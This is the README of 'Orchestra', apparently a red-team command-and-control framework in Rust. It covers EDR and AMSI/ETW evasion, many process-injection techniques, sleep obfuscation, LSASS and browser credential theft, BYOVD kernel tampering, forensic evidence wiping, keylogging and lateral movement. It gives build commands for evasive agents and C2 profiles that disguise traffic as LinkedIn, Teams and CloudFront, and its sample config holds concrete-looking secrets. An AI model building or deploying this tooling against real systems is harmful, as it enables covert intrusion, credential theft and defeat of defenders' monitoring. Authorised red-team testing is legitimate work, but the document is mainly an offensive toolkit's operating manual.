# Orchestra

A cross-platform, operationally secure command-and-control framework built in Rust. Orchestra provides a malleable C2 pipeline, a Windows-only unified injection engine with 15 technique variants, advanced sleep obfuscation with post-wake NTDLL hook re-check, in-process .NET assembly and BOF execution, browser credential extraction (including Chrome v20 DPAPI padding-oracle bypass), LSASS harvesting, LSA SSP credential extraction (Credential Guard bypass), token-only impersonation, kernel callback overwrite (BYOVD), CET/shadow-stack bypass, syscall emulation, EDR bypass transformation, forensic cleanup (Prefetch/MFT/USN), interactive shell sessions, P2P mesh networking, and a standalone redirector binary — all designed for red-team operations requiring granular control over network signatures, memory forensics resistance, and payload delivery.

| | |
|---|---|
| **Language** | Rust 2021 edition |
| **Targets** | `x86_64-pc-windows-gnu`, `x86_64-pc-windows-msvc`, `aarch64-pc-windows-msvc`, `x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`, `x86_64-apple-darwin`, `aarch64-apple-darwin`, `aarch64-linux-android`, `x86_64-linux-android`, `aarch64-apple-ios` |
| **License** | Proprietary |

---

## Architecture Overview

```
                          ┌──────────────┐
                          │   Operator   │
                          │  (console /  │
                          │  web UI)     │
                          └──────┬───────┘
                                 │ HTTPS / WSS
                                 ▼
                          ┌──────────────┐
                          │  Orchestra   │
                          │   Server     │  ◄── Profile hot-reload
                          │  (axum 0.7)  │  ◄── Multi-profile listener
                          └──────┬───────┘  ◄── Module signing (Ed25519)
                                 │
                    ┌────────────┼────────────┐
                    │            │            │
              ┌─────▼────┐ ┌────▼─────┐ ┌────▼─────┐
              │Redirector│ │Redirector│ │Redirector│
              │  (TLS)   │ │  (TLS)   │ │  (TLS)   │
              └─────┬────┘ └────┬─────┘ └────┬─────┘
                    │            │            │
                    └────────────┼────────────┘
                                 │ HTTP/S (malleable)
                                 ▼
                    ┌──────────────────────────┐
                    │         Agent            │
                    │       (in-memory)        │
                    │                          │
                    │ ┌─ evasion/ ───────────┐ │
                    │ │ AMSI · ETW · Unhook  │ │
                    │ │ SyscallEmu · CET     │ │
                    │ │ EDR Transform        │ │
                    │ │ StackSpoof · Evanesco│ │
                    │ └──────────────────────┘ │
                    │ ┌─ injection/ ─────────┐ │  ◄── Sleep obfuscation
                    │ │ Hollow · Transacted  │ │  ◄── Memory hygiene
                    │ │ ModuleStomp · Delayed│ │  ◄── Self-reencode
                    │ │ EarlyBird · Thread   │ │  ◄── Kernel callback
                    │ │ ThreadPool · Fiber   │ │
                    │ │ Callback · Section   │ │
                    │ └──────────────────────┘ │
                    │ ┌─ forensic_cleanup/ ──┐ │
                    │ │ Prefetch · Timestamps│ │
                    │ │ USN · $LogFile       │ │
                    │ └──────────────────────┘ │
                    │ ┌─ post-exploitation ──┐ │
                    │ │ Browser · LSASS      │ │
                    │ │ LSA Whisperer · Token│ │
                    │ │ .NET · BOF · Shells  │ │
                    │ └──────────────────────┘ │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────┼────────────┐
                    │            │            │
              ┌─────▼────┐ ┌────▼─────┐ ┌────▼─────┐
              │ Injected │ │ Injected │ │  P2P     │
              │ Payload  │ │ Payload  │ │  Mesh    │
              └──────────┘ └──────────┘ └──────────┘
```

**Data flow**: Operator commands travel over TLS to the Orchestra server, which dispatches them through redirectors (optional) to the agent. The agent executes commands, injects into target processes, and returns results through the same malleable channel. P2P mesh links allow agents to chain through SMB pipes or TCP for lateral reach without direct C2 connectivity.

### Workspace Crates

| Crate | Type | Purpose |
|-------|------|---------|
| `agent` | lib + bin | Implant: C2 transports, evasion (AMSI/ETW/syscall emulation/CET/EDR transform), injection (15 technique variants), sleep obfuscation, forensic cleanup, persistence, .NET/BOF exec, browser data, LSASS/LSA harvest, token impersonation, kernel callback, surveillance, shells, lateral movement |
| `orchestra-server` | bin | Control center: agent management, module signing, build queue, profile hot-reload |
| `redirector` | bin | Standalone HTTP reverse proxy with cover traffic and registration |
| `common` | lib | Wire protocol (`Message`, `Command`), `Transport` trait, crypto, config types |
| `hollowing` | lib | Process hollowing via NT APIs (PE unmapping, IAT fixup, relocation) |
| `builder` | lib | Cross-compilation build pipeline, PE artifact hardening, profile management |
| `console` | bin | CLI operator console (direct agent connection) |
| `launcher` | bin | Stager: downloads encrypted payload, decrypts, executes via `memfd_create` |
| `keygen` | bin | Generates AES-256 module keys and Ed25519 signing keypairs |
| `payload-packager` | bin | Encrypts agent binaries (AES-256-GCM, polymorphic, stub emission) |
| `shellcode_packager` | lib | Converts PE payloads to position-independent shellcode |
| `module_loader` | lib | Plugin loader: decrypt → verify → memfd/manual-map → FFI |
| `string_crypt` | proc-macro | Compile-time string encryption (`enc_str!`, `enc_wstr!`, `stack_str!`) |
| `code_transform` | lib | Binary diversification: opaque predicates, block reordering, substitution, reg alloc |
| `code_transform_macro` | proc-macro | Attribute macro for per-function code transformation |
| `optimizer` | lib | x86_64 instruction-level optimization passes (NOP insertion, scheduling, substitution) |
| `junk_macro` | proc-macro | Junk code insertion at function boundaries |
| `nt_syscall` | lib | Direct/indirect syscall infrastructure (SSN resolution, Halo's Gate, clean ntdll mapping, unhook callback) |
| `pe_resolve` | lib | PEB walking, ROR-13 export hashing |
| `dev-server` | bin | Lightweight static file server for local testing |
| `orchestra-pe-hardener` | lib | PE header hardening transformations |
| `orchestra-side-load-gen` | lib | DLL side-load payload generator |

---

## Feature Matrix

| Capability | Windows | Linux | macOS | Notes |
|------------|:-------:|:-----:|:-----:|-------|
| **Indirect / Direct Syscalls** | ✅ | ✅* | — | Windows NT dispatch with clean ntdll SSN resolution; Linux direct helper fails closed on unsupported arities |
| **HWBP AMSI Bypass** | ✅ | — | — | Vectored Exception Handler with architecture-native hardware breakpoints |
| **Memory Patch AMSI Bypass** (E_INVALIDARG) | ✅ | — | — | `NtProtectVirtualMemory` syscall, COM hijack fallback |
| **ETW Patching** (NtProtectVirtualMemory) | ✅ | — | — | Patches `EtwEventWrite`, `EtwEventWriteEx`, `NtTraceEvent` |
| **XChaCha20-Poly1305 Memory Guard** | ✅ | ✅ | ✅ | `memory-guard` feature; XMM14/XMM15 key stash on Windows |
| **NtContinue Call Stack Spoofing** | ✅ | — | — | Stack-spoofed syscall dispatch via `NtContinue` |
| **Process Hollowing** | ✅ | — | — | Create suspended → unmap → write → fix relocations/IAT → resume |
| **Module Stomping** (NtWaitForSingleObject) | ✅ | — | — | Overwrites `.text` of legitimate signed DLL in target |
| **Transacted Hollowing** (NTFS fileless) | ✅ | — | — | NTFS transaction-backed section, ETW blinding, fake provider GUIDs |
| **Delayed Module Stomp** | ✅ | — | — | EDR timing-heuristic bypass: load DLL → randomized delay → stomp |
| **EarlyBird APC Injection** | ✅ | — | — | QueueUserAPC before thread resumes |
| **Thread Hijacking** | ✅ | — | — | Suspend → rewrite instruction pointer → resume |
| **Linux Ptrace Injector** | — | ✅* | — | `linux_inject` supports `x86_64` only; other Linux architectures return unsupported |
| **Unified Injection Engine** | ✅ | — | — | Auto-selects technique based on EDR recon; 12-technique fallback chain (Windows-only runtime) |
| **Pre-Injection EDR Reconnaissance** | ✅ | — | — | Module enumeration, integrity check, architecture verification |
| **ThreadPool Injection** (8 variants) | ✅ | — | — | `TpAllocWork`, `TpPostWork`, `CreateTimerQueueTimer`, etc. |
| **Fiber Injection** | ✅ | — | — | `CreateFiber` → `SwitchToFiber` |
| **Context-Only Injection** | ✅ | — | — | `SetThreadContext` IP/SP rewrite with restore trampoline; no new remote thread |
| **Section Mapping Injection** | ✅ | — | — | `NtCreateSection` + `NtMapViewOfSection` dual-mapping |
| **Callback Injection** (12 APIs) | ✅ | — | — | `EnumChildWindows`, `CreateTimerQueueTimer`, etc. |
| **User-Mode Syscall Emulation** | ✅ | — | — | Routes Nt* calls through kernel32/advapi32; invisible to ntdll hooks |
| **CET / Shadow Stack Bypass** | ✅ | — | — | Policy disable, CET-compatible call chains, VEH shadow-stack fix |
| **AMSI Write-Raid Bypass** | ✅ | — | — | Data-only race on `AmsiInitFailed`; zero code/permission/breakpoint mods |
| **Kernel Callback Overwrite** (BYOVD) | ✅ | — | — | 8 vulnerable drivers; ret-pointer overwrite; defeats EDR integrity checks |
| **EDR Bypass Transformation Engine** | ✅ | — | — | Runtime .text signature scanning + 5 semantic-preserving transforms |
| **Token-Only Impersonation** | ✅ | — | — | SetThreadToken / impersonation thread; process-local token cache; auto-revert |
| **Continuous Memory Hiding** (Evanesco) | ✅ | — | — | Per-page RC4 encryption + PAGE_NOACCESS at all times, not just sleep |
| **.NET Assembly Execution** | ✅ | — | — | In-process CLR hosting, fresh AppDomain per exec |
| **BOF / COFF Execution** | ✅ | — | — | Beacon-compatible API, public BOF ecosystem |
| **Interactive Shell Sessions** | ✅ | ✅ | ✅ | cmd.exe / sh / zsh with background reader threads |
| **Browser Data Extraction** | ✅ | — | — | Chrome v20+ DPAPI padding-oracle (C4 Bomb), App-Bound Encryption, Edge, Firefox |
| **LSASS Credential Harvesting** | ✅ | — | — | Indirect syscalls, no MiniDumpWriteDump |
| **LSA Whisperer** (Untrusted/SSP/Auto) | ✅ | — | — | LSA package-interface extraction with SSP injection fallback; no LSASS memory reads |
| **Prefetch Evidence Removal** | ✅ | — | — | Patch/delete .pf files; disable service; USN journal cleanup |
| **NTDLL Unhooking** | ✅ | — | — | `\KnownDlls` re-fetch + disk fallback, post-sleep auto-check |
| **Dynamic SSN Validation** | ✅ | — | — | Cross-reference + probe + SSDT nuclear fallback |
| **Surveillance** (screenshot/keylogger/clipboard) | ✅ | — | — | `surveillance` feature; encrypted ring buffers |
| **Token Manipulation** | ✅ | — | — | MakeToken, StealToken, Rev2Self, GetSystem; thread-safe |
| **Sleep Obfuscation** (full memory encryption) | ✅ | ✅ | ✅ | XChaCha20-Poly1305 region encryption; Cronus (waitable timer) + Ekko variants |
| **Stack Encryption during Sleep** | ✅ | — | — | Full stack frame encryption with safety guarantees |
| **PEB Unlinking & Memory Hygiene** | ✅ | — | — | Module unlink, thread start scrub, handle table scrub |
| **Thread Start Address Scrubbing** | ✅ | — | — | Replaces thread start address to hide anomalous entry points |
| **Handle Table Scrubbing** | ✅ | — | — | Closes/obfuscates suspicious handles |
| **Remote Payload Sleep Enrollment** | ✅ | — | — | Injected payloads opt into the agent's sleep obfuscation cycle |
| **Malleable C2 Profiles** (TOML) | ✅ | ✅ | ✅ | Full profile system: URIs, headers, transforms, SSL, DNS |
| **HTTP Transaction Transforms** | ✅ | ✅ | ✅ | Prepend/append/encode per transaction (GET/POST) |
| **DNS Malleable Profiles** | ✅ | ✅ | ✅ | hex/base32/base64url encoding, configurable beacon/task URIs |
| **DNS-over-HTTPS** (DoH) | ✅ | ✅ | ✅ | Google DoH resolver, configurable server |
| **Domain Fronting** | ✅ | ✅ | ✅ | Separate SNI from actual Host header |
| **Redirection Chains** | ✅ | ✅ | ✅ | Multi-hop failover with sticky sessions + exponential backoff |
| **Forward Secrecy** (X25519 ECDH) | ✅ | ✅ | ✅ | X25519 ECDH key agreement is always enabled; ⚠️ HTTP/DoH ECDH is experimental |
| **Server-Signed Module Delivery** | ✅ | ✅ | ✅ | Ed25519 signatures on all pushed modules |
| **Multi-Operator Audit Attribution** | ✅ | ✅ | ✅ | Per-operator HMAC-SHA256 audit log |
| **Compile-Time String Encryption** | ✅ | ✅ | ✅ | `string_crypt` proc-macros; ChaCha20 with per-build keys |
| **Binary Diversification** | ✅ | ✅ | ✅ | `junk_macro`, `optimizer`, `code_transform`, `self_reencode` |
| **Cross-Platform Persistence** | ✅ | ✅ | ✅ | Registry Run, COM Hijack, LaunchAgent, cron, WMI via COM |
| **Lateral Movement** | ✅ | — | — | PsExec, WMI, DCOM, WinRM — no PowerShell |
| **Linux In-Memory Execution** | — | ✅ | — | `memfd_create` + `fexecve` |
| **Linux RW→RX Transition** | — | ✅ | — | `mmap` RW → write → `mprotect` RX |
| **HKDF-SHA256 Key Derivation** | ✅ | ✅ | ✅ | All session keys derived via HKDF |
| **Per-Build Randomized IoCs** | ✅ | ✅ | ✅ | `build.rs` generates random pipe names, DNS prefixes, service names |
| **Server Credential Enforcement** | ✅ | ✅ | ✅ | No default credentials; startup fails without explicit tokens |
| **Profile Hot-Reload** | ✅ | ✅ | ✅ | Server watches profile directory; zero-downtime updates |
| **Multi-Profile Support** | ✅ | ✅ | ✅ | Multiple profiles served simultaneously per listener |

---

## Quick Start

### Prerequisites

```bash
# Install Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add common cross-compilation targets
rustup target add \
  x86_64-pc-windows-gnu x86_64-pc-windows-msvc aarch64-pc-windows-msvc \
  x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu \
  x86_64-apple-darwin aarch64-apple-darwin

# Install MinGW for Windows GNU builds and Windows headers on Linux hosts
sudo apt install mingw-w64  # Debian/Ubuntu

# Install Zig for the checked Darwin, Windows MSVC, and Linux ARM64 C build scripts
# (use your package manager or a release from https://ziglang.org/download/)
zig version
```

### Build the Server

```bash
cargo build --release --package orchestra-server
```

Create a server configuration file (`orchestra-server.toml`):

```toml
http_addr            = "0.0.0.0:8443"
agent_addr           = "0.0.0.0:8444"
agent_shared_secret  = "RvDPwz+Xl7WuOkRnE3mIJjDy9B9oDyMvUg8fYSZ2EFg="
admin_token          = "0juoV2FGURAA8lUJ8HzALnXHOKE_yvdg"
audit_log_path       = "secrets/orchestra-audit.jsonl"
static_dir           = "orchestra-server/static"
tls_cert_path        = "secrets/server.crt"
tls_key_path         = "secrets/server.key"
command_timeout_secs = 30
builds_output_dir    = "builds"
module_aes_key       = "<base64-32-bytes>"  # required for production agent builds

# Local testing only — allows agents to connect to loopback/private IPs:
# allow_local_builds = true
```

Generate credentials and self-signed TLS material:

```bash
./scripts/generate-certs.sh
# Generates secrets/server.crt and secrets/server.key
# Prints the SHA-256 fingerprint for TLS pinning
```

Start the server:

```bash
./target/release/orchestra-server --config orchestra-server.toml
```

### Build an Agent

The recommended way is via the **Builder tab** in the web dashboard
(`https://<server>:8443/`) or the build REST API:

```bash
# Submit a build via the API
curl -sk -X POST https://localhost:8443/api/build \
  -H "Authorization: Bearer <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "os": "linux",
    "arch": "x86_64",
    "host": "10.0.0.5",
    "port": 8444,
    "pin": "<sha256-cert-fingerprint-64-hex>",
    "key": "<base64-aes256-encryption-key>",
    "features": {
      "persistence": true,
      "direct_syscalls": true,
      "stealth": true
    },
    "sleep_ms": 5000,
    "jitter": 20
  }'
# → {"job_id":"<uuid>","status":"Queued"}

# Poll for completion
curl -sk -H "Authorization: Bearer <admin-token>" \
  https://localhost:8443/api/build/status/<job_id>

# Download the encrypted payload
curl -sk -H "Authorization: Bearer <admin-token>" \
  https://localhost:8443/api/build/<job_id>/download -o agent.enc
```

Or directly with Cargo for development:

```bash
# Cross-compile for Windows with full evasion
cargo build --release --package agent \
    --target x86_64-pc-windows-gnu \
    --features "http-transport,outbound-c,direct-syscalls,memory-guard,stack-spoof,cet-bypass,token-impersonation,forensic-cleanup,write-raid-amsi,syscall-emulation"

# Linux agent with outbound connection
cargo build --release --package agent \
    --bin agent-standalone \
    --features "outbound-c" \
    --target x86_64-unknown-linux-gnu
```

The build API uses the `orchestra-builder` binary and applies all profile
settings (host, port, PSK, TLS fingerprint, module AES key, features) as
compile-time environment variables so the resulting binary is self-contained.

### Build a Redirector

```bash
cargo build --release --package redirector
```

```bash
./target/release/redirector \
    --listen-addr 0.0.0.0:443 \
    --c2-addr 10.0.0.1:8443 \
    --profile profiles/cloudfront.profile \
    --cover-content /var/www/cover/ \
    --tls-cert /etc/letsencrypt/live/example.com/fullchain.pem \
    --tls-key /etc/letsencrypt/live/example.com/privkey.pem \
    --server-api https://10.0.0.1:8443 \
    --server-token your-admin-token
```

### Minimal Malleable Profile

The standalone `redirector` binary uses a minimal top-level URI-matching
profile parser. Full server-side malleable profiles use nested `[profile.*]`
sections, as shown in the next section.

```toml
[profile]
name = "quickstart"
author = "operator"
description = "Minimal profile for testing"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

[http_get]
uri = ["/api/v1/status", "/api/v1/health"]
verb = "GET"

[http_get.headers]
Accept = "application/json"
Connection = "keep-alive"

[http_get.client]
prepend = """"""
append = """"""

[http_post]
uri = ["/api/v1/data", "/api/v1/report"]
verb = "POST"

[http_post.headers]
Content-Type = "application/json"

[dns]
enabled = false
```

---

## Malleable Profiles

The malleable C2 profile system controls every aspect of the agent's network communication: URIs, headers, HTTP transaction transforms, DNS encoding, SSL settings, and timing. Profiles are defined in TOML and loaded at build time or hot-reloaded on the server.

### TOML Schema

The server and agent malleable-profile parser expects a root `[profile]` table
with nested `[profile.*]` sections.

#### `[profile]` — Profile Metadata

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `name` | string | `"default"` | Profile identifier |
| `author` | string | `""` | Author attribution |
| `description` | string | `""` | Profile description |

#### `[profile.global]` — Global Settings

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `user_agent` | string | Chrome 125 UA | HTTP User-Agent string |
| `jitter` | u8 | `0` | Sleep jitter percentage (0–100) |
| `sleep_time` | u64 | `60` | Base sleep interval in seconds |
| `dns_idle` | string | `"0.0.0.0"` | DNS idle IP for beacon |
| `dns_sleep` | u64 | `0` | DNS query interval |

#### `[profile.ssl]` — TLS Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `true` | Enable TLS |
| `cert_pin` | string | `""` | SHA-256 hex fingerprint for certificate pinning |
| `ja3_fingerprint` | string | `""` | JA3 fingerprint for TLS client hello |
| `sni` | string | `""` | Custom SNI hostname |

#### `[profile.http_get]` / `[profile.http_post]` — HTTP Transactions

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `uri` | string[] | `[]` | List of URI paths (randomly selected per request) |
| `verb` | string | `"GET"` / `"POST"` | HTTP method |
| `headers` | map | `{}` | HTTP headers to send |

Sub-tables `[profile.http_get.client]`, `[profile.http_get.server]`, `[profile.http_post.client]`, `[profile.http_post.server]`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `prepend` | string | `""` | Prepend to data before encoding |
| `append` | string | `""` | Append to data after encoding |
| `transform` | string | `"None"` | Transform type: `None`, `Base64`, `Base64Url`, `Mask`, `Netbios`, `NetbiosU` |
| `mask_stride` | u32 | `0` | Mask XOR stride (for `Mask` transform) |

#### `[profile.http_get.metadata]` / `[profile.http_post.output]` — Data Delivery

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `delivery` | string | `"Cookie"` / `"Body"` | Delivery method: `Cookie`, `UriAppend`, `Header`, `Body` |
| `key` | string | `"session"` | Key name for Cookie/Header/UriAppend delivery |
| `transform` | string | `"Base64"` | Transform applied to data |

#### `[profile.dns]` — DNS C2 Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Enable DNS C2 |
| `beacon` | string | `""` | Beacon query pattern |
| `get_A` | string | `""` | Task retrieval A record pattern |
| `get_TXT` | string | `""` | Task retrieval TXT record pattern |
| `post` | string | `""` | Data exfil query pattern |
| `max_txt_size` | u32 | `252` | Max TXT record payload size |
| `dns_suffix` | string | `""` | DNS suffix domain |
| `encoding` | string | `"hex"` | Encoding: `hex`, `base32`, `base64url` |

#### `[profile.dns.headers]` — DoH Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `doh_server` | string | `"https://dns.google/dns-query"` | DoH resolver URL |
| `doh_method` | string | `"POST"` | DoH HTTP method |

### Transform Types

| Transform | Encoding | Decoding | Notes |
|-----------|----------|----------|-------|
| `None` | Identity | Identity | No transformation |
| `Base64` | Standard Base64 | Standard Base64 | `+/` with `=` padding |
| `Base64Url` | URL-safe Base64 | URL-safe Base64 | `-_` without padding |
| `Mask` | XOR with rotating key | XOR with rotating key | `mask_stride` controls key rotation |
| `Netbios` | NetBIOS encoding (A–P) | NetBIOS decoding | Uppercase hex nibble + 'A' |
| `NetbiosU` | NetBIOS encoding (a–p) | NetBIOS decoding | Lowercase hex nibble + 'a' |

### Delivery Methods

| Method | Agent Sends Data | Server Sends Data |
|--------|-----------------|-------------------|
| `Cookie` | Data in `Cookie` header | Data in `Set-Cookie` header |
| `UriAppend` | Data appended to URI after separator | Data extracted from URI |
| `Header` | Data in custom header | Data in response header |
| `Body` | Data in HTTP body | Data in response body |

### Example Profile: LinkedIn Mimic

```toml
[profile]
name = "linkedin"
author = "red-team"
description = "Mimics LinkedIn API traffic"

[profile.global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
jitter = 37
sleep_time = 60

[profile.ssl]
enabled = true
cert_pin = ""
sni = ""

[profile.http_get]
uri = ["/linkedin/li", "/voyager/api/me", "/voyager/api/growth/normInvitations"]
verb = "GET"

[profile.http_get.headers]
Accept = "application/vnd.linkedin.normalized+json+2.1"
Connection = "keep-alive"
Referer = "https://www.linkedin.com/feed/"

[profile.http_get.metadata]
delivery = "Cookie"
key = "li_at"
transform = "Base64"

[profile.http_get.client]
prepend = "JSESSIONID=ajax:1234567890;"
append = ";"

[profile.http_get.server]
prepend = ""
append = ""

[profile.http_post]
uri = ["/voyager/api/growth/normInvitationAction", "/voyager/api/events/drilldowns"]
verb = "POST"

[profile.http_post.headers]
Accept = "application/json"
Content-Type = "application/json"
Referer = "https://www.linkedin.com/feed/"

[profile.http_post.output]
delivery = "Body"
transform = "Base64"

[profile.http_post.client]
prepend = "{\"csrfToken\":\"ajax:1234567890\",\"data\":\""
append = "\"}"

[profile.http_post.server]
prepend = ""
append = ""

[profile.dns]
enabled = false
```

### Example Profile: CloudFront/CDN with Domain Fronting

```toml
[profile]
name = "cloudfront"
author = "red-team"
description = "CloudFront CDN profile with domain fronting and redirectors"

[profile.global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
jitter = 20
sleep_time = 45

[profile.ssl]
enabled = true
cert_pin = ""
sni = ""

[profile.http_get]
uri = ["/cdn-cgi/trace", "/images/sprites/nav-sprite_global-1x-hm-dsk-reorg._CB405686684_.png"]
verb = "GET"

[profile.http_get.headers]
Host = "d111111abcdef8.cloudfront.net"
Accept = "image/webp,image/apng,image/*,*/*;q=0.8"
Connection = "keep-alive"

[profile.http_get.metadata]
delivery = "Cookie"
key = "CloudFront-Policy"
transform = "Base64Url"

[profile.http_get.client]
prepend = ""
append = ""

[profile.http_get.server]
prepend = ""
append = ""

[profile.http_post]
uri = ["/cdn-cgi/beacon/performance", "/api/1.0/website/monitor"]
verb = "POST"

[profile.http_post.headers]
Host = "d111111abcdef8.cloudfront.net"
Content-Type = "application/octet-stream"
Accept = "*/*"

[profile.http_post.output]
delivery = "Body"
transform = "Base64Url"

[profile.http_post.client]
prepend = ""
append = ""

[profile.http_post.server]
prepend = ""
append = ""

[profile.dns]
enabled = false
```

Domain fronting is configured at build time via the `front_domain` field in the agent's C2 configuration. The agent connects to the front domain's IP but sends the `Host` header matching the profile's configured header. This causes CDN edge nodes to route to the correct origin (the redirector or direct C2).

### Example Profile: Microsoft Teams

```toml
[profile]
name = "teams"
author = "red-team"
description = "Mimics Microsoft Teams API traffic for corporate environments"

[profile.global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Teams/24100.1.0.0"
jitter = 25
sleep_time = 50

[profile.ssl]
enabled = true
cert_pin = ""
sni = ""

[profile.http_get]
uri = ["/v1/users/ME/conversations", "/v1/users/ME/contacts", "/api/calls/getCalls"]
verb = "GET"

[profile.http_get.headers]
Accept = "application/json"
Authorization = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6I"
Connection = "keep-alive"
Referer = "https://teams.microsoft.com/"
X-Ms-Client-Version = "24100.1.0.0"

[profile.http_get.metadata]
delivery = "Header"
key = "X-Ms-Telemetry"
transform = "Base64"

[profile.http_get.client]
prepend = "v1/users/ME/"
append = "/messages"

[profile.http_get.server]
prepend = ""
append = ""

[profile.http_post]
uri = ["/v1/users/ME/conversations/48:notes/messages", "/v1/users/ME/chats/presence"]
verb = "POST"

[profile.http_post.headers]
Accept = "application/json"
Content-Type = "application/json"
Referer = "https://teams.microsoft.com/"
X-Ms-Client-Version = "24100.1.0.0"

[profile.http_post.output]
delivery = "Body"
transform = "Base64"

[profile.http_post.client]
prepend = "{\"content\":\""
append = "\",\"messagetype\":\"RichText/Html\"}"

[profile.http_post.server]
prepend = ""
append = ""

[profile.dns]
enabled = false
```

---

## Injection Engine

The unified injection engine (`injection_engine.rs`) is Windows-only at runtime and provides a single API for injecting payloads into target processes with automatic technique selection, EDR reconnaissance, and fallback chains.

On Linux, injection support is provided by the `linux_inject` path and is currently limited to `x86_64` targets. Non-`x86_64` Linux builds report injector unavailability instead of attempting unsupported register/context operations.

### Techniques

| Technique | Method | EDR Evasion | Best For |
|-----------|--------|-------------|----------|
| **Process Hollowing** | Create suspended → unmap → write payload → fix relocations/IAT → resume | Medium — creates visible process | Standalone payloads |
| **Module Stomping** | Overwrite `.text` of legitimate signed DLL in target | High — runs inside legitimate module | Long-lived implants |
| **EarlyBird APC** | `QueueUserAPC` on suspended thread before resume | High — executes before main thread | Process creation hooks |
| **Thread Hijacking** | Suspend → rewrite RIP → resume | Medium — visible thread anomaly | Quick shellcode |
| **Thread Pool** | `TpAllocWork` / `TpPostWork` callback | Very High — no new thread created | Async operations |
| **Fiber Injection** | `CreateFiber` → `SwitchToFiber` | High — fiber context switch | Complex payloads |

### Pre-Injection EDR Reconnaissance

Before injection, the engine performs reconnaissance on the target process:

1. **Module enumeration** — Walks PEB to list loaded DLLs
2. **EDR module detection** — Checks for known EDR driver DLLs (CrowdStrike, SentinelOne, Carbon Black, etc.)
3. **Architecture match** — Verifies target process matches agent architecture
4. **Integrity level** — Checks if target is running elevated

Returns `InjectionViability`:
- `Safe { arch_match, thread_count, integrity_level, recommended_technique }` — No EDR detected
- `HasEDRModule { modules, fallback_technique }` — EDR present, suggests stealthier technique
- `IsEDR` — Target is an EDR process itself; abort
- `ArchitectureMismatch` — 32-bit vs 64-bit mismatch

### Decision Flowchart

```
Target process identified
         │
         ▼
┌─────────────────────┐
│ Pre-injection recon │
│  - Walk PEB         │
│  - Check EDR DLLs   │
│  - Verify arch      │
│  - Check integrity  │
└────────┬────────────┘
         │
    ┌────▼────┐
    │Is EDR?  │──── Yes ──► ABORT
    └────┬────┘
         │ No
    ┌────▼────────┐
    │EDR modules? │──── Yes ──► Select stealthiest technique
    └────┬────────┘             (ThreadPool > Fiber > ModuleStomp)
         │ No
    ┌────▼────────────────┐
    │ User-specified      │──── Yes ──► Use specified technique
    │ technique?          │
    └────┬────────────────┘
         │ No (auto-select)
    ┌────▼────────────────────┐
    │ Priority:               │
    │ 1. ThreadPool           │
    │ 2. Fiber                │
    │ 3. EarlyBird APC        │
    │ 4. ModuleStomp          │
    │ 5. ThreadHijack         │
    │ 6. ProcessHollow        │
    └────┬────────────────────┘
         │
    ┌────▼──────┐
    │ Inject    │──── Failure ──► Try next technique
    └────┬──────┘
         │ Success
    ┌────▼──────────┐
    │ Optionally    │
    │ enroll in     │
    │ sleep cycle   │
    └───────────────┘
```

### Remote Payload Sleep Enrollment

Injected payloads can opt into the agent's sleep obfuscation cycle via `InjectionHandle::enroll_sleep()`. This installs a per-payload stub that:
1. Receives the encryption key via XMM14/XMM15 registers
2. Encrypts the payload's memory region during agent sleep
3. Decrypts on wake

---

## Sleep Obfuscation

The sleep obfuscation system (`sleep_obfuscation.rs`, `memory_guard.rs`, `obfuscated_sleep.rs`) encrypts all agent memory regions during idle periods to defeat memory scanning.

### Sleep Cycle

```
┌─────────────────────────────────────────────────────┐
│                    SLEEP CYCLE                       │
│                                                     │
│  1. Track memory regions (RW+RX pages)              │
│  2. Generate per-sleep XChaCha20-Poly1305 key       │
│  3. Stash key in XMM14/XMM15 registers             │
│  4. Encrypt all tracked regions                     │
│  5. Encrypt stack frames (optional)                 │
│  6. Spoof call stack (NtContinue)                   │
│  7. Anti-forensics:                                 │
│     - Unlink from PEB                               │
│     - Zero PE headers (NOACCESS)                    │
│     - Scrub thread start addresses                  │
│     - Scrub handle table                            │
│  8. Set wake timer                                  │
│  9. NtDelayExecution (sleep)                        │
│  10. Wake → integrity check (hash verification)     │
│  11. Decrypt all regions                            │
│  12. Decrypt stack                                  │
│  13. Resume normal operation                        │
└─────────────────────────────────────────────────────┘
```

### Memory Region Tracking

The system maintains a registry of memory regions to encrypt:

- **Agent `.text` section** — Primary code region
- **Agent `.rdata` / `.data` sections** — Read-only data and globals
- **Heap allocations** — Dynamically allocated buffers (via `memory_guard` registration)
- **Injected payload regions** — Remotely enrolled payload memory

Each region is snapshotted with its original protection level, encrypted with a unique nonce, and restored to its original state on wake.

### Stack Encryption

On Windows, the full stack is encrypted during sleep. The system:
1. Walks the stack from current RSP to the stack base
2. Identifies and preserves return addresses (for stack unwinding)
3. Encrypts all non-return-address bytes with XChaCha20-Poly1305
4. Restores on wake

### Integrity Verification

After wake, each decrypted region is hashed (SHA-256) and compared against the pre-sleep hash. Tampered regions trigger an alert and the agent enters a safe state.

### Key Management

- Per-sleep keys are generated using `OsRng`
- Keys are stashed in XMM14/XMM15 registers (Windows) to avoid memory exposure
- Keys are never written to disk or logged
- Key handles auto-zero on Drop

---

## Redirector Deployment

### Architecture

```
Internet                VPS (Redirector)              Internal Network
───────                 ────────────────              ────────────────

                          ┌──────────────┐
                          │  Redirector  │
                          │  (axum 0.7)  │
User ──HTTPS─────────────►│              │
